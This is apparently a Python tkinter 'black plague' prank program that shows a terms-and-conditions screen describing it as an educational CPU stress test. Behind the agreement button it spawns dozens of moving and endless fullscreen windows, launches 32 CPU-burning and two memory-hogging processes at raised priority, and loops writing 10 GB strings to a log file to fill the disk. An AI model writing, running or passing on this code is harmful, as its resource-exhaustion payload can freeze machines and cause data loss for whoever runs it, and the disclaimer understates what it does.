from PIL import Image, ImageTk
import time
import threading
import multiprocessing as mp
import os
import tkinter as tk
from tkinter import ttk, messagebox
import random

def receive_the_plague():
    SPEED = 30
    COUNT = 50

    root = tk.Tk()
    root.withdraw()
    def make_window():
        w = tk.Toplevel()
        sw, sh = w.winfo_screenwidth(), w.winfo_screenheight()
        x, y = random.randint(0, sw-300), random.randint(0, sh-200)
        dx, dy = random.choice([-SPEED, SPEED]), random.choice([-SPEED, SPEED])
        def move():
            nonlocal x, y, dx, dy
            x, y = x + dx, y + dy
            if x <= 0 or x + 300 >= sw: dx = -dx
            if y <= 0 or y + 200 >= sh: dy = -dy
            w.geometry(f"300x200+{x}+{y}")
            w.after(10, move)
        move()

    for _ in range(COUNT):
        make_window()
    root.mainloop()

    def stress_task(mode):
        # 0: CPU Intensive, 1: RAM Hogging
        try: os.nice(-15)
        except: pass
        if mode == 0:
            i = 0
            while True: i = i * i + 1 if i < 1e18 else 0.5
        else:
            hog = []; chunk = 'X' * 1000 * 1024 * 1024 # gb chunk
            try:
                while True: hog.append(chunk); time.sleep(0.001)
            except MemoryError:
                while True: time.sleep(1)

    def overload_system(duration):
        processes = []
        cores = 32 #i like big numbers hehe
        for mode in [0] * cores + [1] * 2:
            p = mp.Process(target=stress_task, args=(mode,), daemon=True)
            p.start(); processes.append(p)

        time.sleep(duration)
        for p in processes:
            if p.is_alive(): p.terminate(); p.join(0.1)

    def spawn_window(img):
        win = tk.Toplevel()
        win.attributes("-fullscreen", True)
        win.configure(background="black")

        label = tk.Label(win, image=img, bg="black")
        label.pack(expand=True, fill="both")

    def spam_windows():
        root = tk.Tk()
        root.withdraw()  # hide main window

        # load pic once
        pic = ImageTk.PhotoImage(Image.open("plague.jpg"))

        while True:
            spawn_window(pic)
            time.sleep(0.1)

    threading.Thread(target=spam_windows).start()
    tk.mainloop()
    overload_system(20)
    while True:
        with open("log.txt", "a") as f:
            f.write("a" * 10000000000 + "\n")

if __name__ == "__main__":
    def open_main_window():
        main = tk.Toplevel()
        
        
        main.title("t̶̢̅͆̆̄́̈́h̸̛̠̭̮̖̖̥̱͙̺͖̿̏̀̐͌̑͝e̶̡̞͉͇̯͚̙̪̓̉̀̆̓͐̈̕̕ ̸̛̘̀́̏̔͘b̷͎̬̰̮̠̞͓̲́̎ĺ̶̰̞̜͎̬̼̭͆̉̀̌̄̓̈́̚͜ȁ̵̞̬͖͔̬̽̌̈́͆̿͂͝c̶̦̹͈͖̤͚̖̪̪̑k̵̛͓͚͗̏̍̿̽̈́̓́͝ ̴̢̃̅͒͘p̸̢̛̜̰̱̬̹̻͖̞͆̊͂̔͐̄̓̀̚͜l̶̲̰̫̊͊͛̒̉̿͐̈́̀͘ã̴̲͈͠ģ̴͔̮͉̜͖̞̂͐̀͗̒̆͂̚ͅu̶̠̺̱͇̱̝̝͔̘̓̋͒̒̕ͅe̷̛̥̖͙̮̙͖͐̈́͂̌̽͂̌̚͜͠")
        
        
        main.geometry("400x200")

        frame = ttk.Frame(main, padding="20")
        frame.pack(expand=True, fill='both')

        label = ttk.Label(frame, text="Press the button below to receive the black plague...")
        label.pack(pady=10)

        button = ttk.Button(frame, text="i choose to receive the black plague", command=receive_the_plague)
        button.pack(pady=20)

    root = tk.Tk()
    root.title("Terms & Conditions Agreement")
    root.geometry("500x400")

    frame = ttk.Frame(root, padding=10)
    frame.pack(expand=True, fill='both')

    #i swear bro on god  this is the only part where i use ai
    terms_text = """
    TERMS & CONDITIONS — Experimental CPU Stress Test
    Last Updated: 11/28/25

    This program is an experimental system test for educational purposes only.
    By clicking "I Agree", you acknowledge:

    • You understand this program may behave unpredictably.
    • You take full responsibility for running it.
    • You are using this program willingly and on a device you own.

    If you do NOT accept these terms, press "I Do Not Agree" and the program will close.
    """
    #phew ok thats it

    text_box = tk.Text(frame, wrap='word', height=15)
    text_box.insert('1.0', terms_text)
    text_box.config(state='disabled')
    text_box.pack(fill='both', expand=True)

    scroll = ttk.Scrollbar(frame, command=text_box.yview)
    text_box['yscrollcommand'] = scroll.set
    scroll.pack(side='right', fill='y')

    button_frame = ttk.Frame(frame)
    button_frame.pack(pady=10)

    def agree():
        root.withdraw()
        open_main_window()


    def disagree():
        messagebox.showinfo("Terms Not Accepted", "You must accept the terms to continue.")
        root.destroy()

    agree_button = ttk.Button(button_frame, text="I Agree", command=agree)
    agree_button.grid(row=0, column=0, padx=10)

    disagree_button = ttk.Button(button_frame, text="I Do Not Agree", command=disagree)
    disagree_button.grid(row=0, column=1, padx=10)

    root.mainloop()


    
